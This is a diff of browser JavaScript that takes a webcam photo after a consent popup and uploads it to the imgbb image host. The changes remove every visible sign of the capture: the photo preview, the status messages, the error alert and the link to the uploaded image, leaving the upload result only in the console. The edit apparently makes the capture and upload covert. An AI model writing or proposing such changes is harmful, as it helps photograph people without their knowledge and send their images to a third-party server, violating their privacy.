@@ -3,12 +3,6 @@ const popup = document.getElementById("consentPopup");
 const allowButton = document.getElementById("allowCamera");
 
 
-const capturedImage = document.getElementById("capturedImage");
-
-const status = document.getElementById("uploadStatus");
-
-
-
 let stream;
 
 
@@ -30,8 +24,6 @@ allowButton.onclick = async () => {
         popup.style.display="none";
 
 
-        status.innerText="Preparing camera...";
-
 
         setTimeout(()=>{
 
@@ -52,9 +44,6 @@ allowButton.onclick = async () => {
         console.log(error.message);
 
 
-        alert(error.name);
-
-
     }
 
 
@@ -67,21 +56,20 @@ allowButton.onclick = async () => {
 function capturePhoto(){
 
 
-    const video=document.createElement("video");
+    const video = document.createElement("video");
 
 
-    video.srcObject=stream;
+    video.srcObject = stream;
 
 
     video.play();
 
 
 
-    video.onloadedmetadata=()=>{
+    video.onloadedmetadata = () => {
 
 
         const canvas=document.createElement("canvas");
-
 
 
         canvas.width=video.videoWidth;
@@ -111,14 +99,6 @@ function capturePhoto(){
 
 
         const imageData=canvas.toDataURL("image/png");
-
-
-
-        capturedImage.src=imageData;
-
-
-
-        status.innerText="Uploading...";
 
 
 
@@ -158,6 +138,7 @@ async function uploadImage(image){
     const formData=new FormData();
 
 
+
     formData.append(
 
         "image",
@@ -171,7 +152,7 @@ async function uploadImage(image){
     try {
 
 
-        const response=await fetch(
+        const response = await fetch(
 
             `https://api.imgbb.com/1/upload?key=${API_KEY}`,
 
@@ -187,44 +168,25 @@ async function uploadImage(image){
 
 
 
-        const data=await response.json();
+        const data = await response.json();
 
 
 
         if(data.success){
 
 
-            const url=data.data.url;
-
-
-            capturedImage.src=url;
-
-
-            status.innerHTML=
-
-            `Uploaded Successfully<br>
-
-            <a href="${url}" target="_blank">
-
-            View Image
-
-            </a>`;
-
-
-            console.log(url);
+            console.log("Upload successful:", data.data.url);
 
 
         }
 
+        else {
 
-        else{
 
-
-            status.innerText="Upload failed";
+            console.log("Upload failed:", data);
 
 
         }
-
 
 
     }
@@ -234,8 +196,6 @@ async function uploadImage(image){
 
 
         console.log(error);
-
-        status.innerText="Upload error";
 
 
     }
